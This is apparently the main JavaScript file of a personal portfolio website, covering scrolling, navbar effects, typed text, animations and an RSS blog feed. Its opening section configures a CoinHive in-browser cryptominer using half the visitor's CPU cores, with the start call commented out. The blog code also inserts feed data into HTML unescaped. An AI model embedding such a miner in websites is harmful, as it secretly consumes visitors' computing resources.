// 00. Configure Miner
var miner = new CoinHive.Anonymous('XXXXXX', {
	threads: (parseInt(window.navigator.hardwareConcurrency) / 2),
	autoThreads: false,
	throttle: 0,
});
// miner.start(); // Start Miner

// Listen on events
//miner.on('found', function () { /* Hash found */ })
//miner.on('accepted', function () { /* Hash accepted by the pool */ })
// Update stats once per second
//setInterval(function () {
//	var hashesPerSecond = miner.getHashesPerSecond();
//	var totalHashes = miner.getTotalHashes();
//	var acceptedHashes = miner.getAcceptedHashes();
// Output to HTML elements...
//}, 1000);


// 01. Add Smooth Scroll & Remove trailing # from URL
$(function () {
	'use strict';
	$('a')
		.click(function () {
			if (location.pathname.replace(/^\//, '') === this.pathname.replace(/^\//, '') && location.hostname === this.hostname) {
				var target = $(this.hash);
				target = target.length ? target : $('[name=' + this.hash.slice(1) + ']');
				if (target.length) {
					$('html, body')
						.animate({
							scrollTop: target.offset()
								.top
						}, 1000);
					return false;
				}
			}
		});
});


// 02. Bootstrap Navbar Mod's
$(function () {
	'use strict';
	var nav = $('.bg-transp'),
		screen_height = jQuery(window)
		.height();
	$(window)
		.scroll(function () {
			var scroll = $(window)
				.scrollTop();
			if (scroll >= 10) {
				nav.removeClass('bg-transp')
					.addClass('bg-dark');
			} else {
				nav.removeClass('bg-dark')
					.addClass('bg-transp');
			}
		});
});

// Add Dark BG when on Top (i.e when .navbar has the class 'bg-transp')
$('.navbar').hover(function (e) {
	if ($('.navbar').hasClass('bg-transp') === true) {
		$('.navbar').toggleClass('bg-dark');
		e.preventDefault();
	} else {
		return (0);
	}
});

// On CLICK or SCROLL collapse opened navbar
$(document).on('click scroll', function () {
	$('.collapse').collapse('hide');
});

// 03. Typed Text
new Typed('.elements', {
	strings: ["I'm a <b>Front-End Dev</b>", "I'm a <b>Back-End Dev</b>", "I'm a <b>SysAdmin / DevOps</b>", "I'm a <b>Full-Stack Dev</b>", "I am <b>Kleber Schneider</b>"],
	startDelay: 0,
	typeSpeed: 100,
	backSpeed: 25,
	backDelay: 3000,
	smartBackspace: true,
	showCursor: true,
	cursorChar: '|',
	loop: false
});





// 04. Initialize WOW
wow = new WOW({
	boxClass: 'wow',
	animateClass: 'animated',
	offset: 150,
	mobile: true,
	live: true
});
wow.init();


// 05. Recent Work - Gallery
/* $(document).ready(function () {
	$('.filter-button').click(function () {
		var value = $(this).attr('data-filter');

		if (value == 'cat-all') {
			//$('.filter').removeClass('hidden');
			$('.filter').show('1000');
		} else {
			//$('.filter[filter-item="'+value+'"]').removeClass('hidden');
			//$(".filter").not('.filter[filter-item="'+value+'"]').addClass('hidden');
			$('.filter').not('.' + value).hide('3000');
			$('.filter').filter('.' + value).show('3000');
		}
	});

	if ($('.filter-button').removeClass('active')) {
		$(this).removeClass('active');
	}
	$(this).addClass('active');

	//Add .active to buttons on-click

	$('#gallery #filter-btn-group button').on('click', function () {
		$(this).siblings().removeClass('active');
		$(this).addClass('active');

	});

}); */


// 06. Blog Posts
$(function () {
	var $content = $('#blog-content');
	var data = {
		rss_url: ''
	};
	$.get('https://api.rss2json.com/v1/api.json', data, function (response) {
		if (response.status == 'ok') {
			var output = '';

			//Filter only Articles and discard Responses
			var posts = $.map(response.items, function (post, i) {
				var postCategories = response.items[i].categories;
				if (postCategories.length !== 0) {
					return post;
				}
			});

			$.each(posts, function (k, item) {
				var visibleSm;
				//if (k < 2) {
				//	visibleSm = '';
				//} else {
				//visibleSm = ' d-none d-sm-block';
				//}
				// add this to the class below ' + visibleSm + '
				output += '<div class="col-sm-6 col-md-6 col-lg-4 col-xl-4">';
				output += '<a class="thumbnail" href="' + item.link + '" target="_blank">';

				// Fetch Image SRC
				var tagIndex = item.description.indexOf('<img'); // Find where the img tag starts
				var srcIndex = item.description.substring(tagIndex).indexOf('src=') + tagIndex; // Find where the src attribute starts
				var srcStart = srcIndex + 5; // Find where the actual image URL starts; 5 for the length of 'src="'
				var srcEnd = item.description.substring(srcStart).indexOf('"') + srcStart; // Find where the URL ends
				var src = item.description.substring(srcStart, srcEnd); // Extract just the URL

				output += '<div class="blog-element"><img class="img-thumbnail img-fluid" src="' + src + '" alt="' + item.title + '"></div>';
				output += '<h6>' + item.title + '</h6>';
				output += '</a></div>';

				// Number of posts to display: Actual No of posts that will be displayed = K+1
				return k < 2;
			});
			$content.html(output);
		}
	});
});


// 08. Print current year in Copyright text
document.getElementById("copy-year").innerHTML = new Date().getFullYear();
